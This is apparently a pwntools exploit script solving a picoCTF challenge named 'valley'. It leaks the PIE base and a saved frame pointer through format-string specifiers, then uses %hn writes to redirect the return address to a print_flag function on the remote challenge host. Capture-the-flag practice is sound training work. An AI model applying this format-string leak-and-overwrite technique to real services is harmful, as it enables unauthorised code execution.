#!/usr/bin/env python3
from pwn import *
import tty
context.binary="./valley"
e=context.binary
#r=process(e.path, env={"LD_PRELOAD":"./libc.so.6"})
r=remote("shape-facility.picoctf.net", 62735)

r.recvline()
r.sendline("%21$p")
r.recvuntil("distance:")
leak=int(r.recvline().strip(), 16)
e.address=leak-e.sym.main-18
success("PIE base : %s" % hex(e.address))
r.sendline("%20$p")
r.recvuntil("distance:")
rbp=int(r.recvline().strip(), 16)-0x10
success("Old rbp : %s" % hex(rbp))

# 0x7fffda60ac38 —▸ 0x7fffda60ad38 —▸ 0x7fffda60afb7 ◂— '/ctf/work/val/valley'

payload="%{}c%{}$hn".format((rbp+8)&0xffff, 20+(0x130-0x70)//8)
r.sendline(payload)
r.recv()

payload="%{}c%{}$hn".format((e.sym.print_flag)&0xffff, 20+(0x1b8-0x70)//8)
r.sendline(payload)
r.recv()

r.interactive()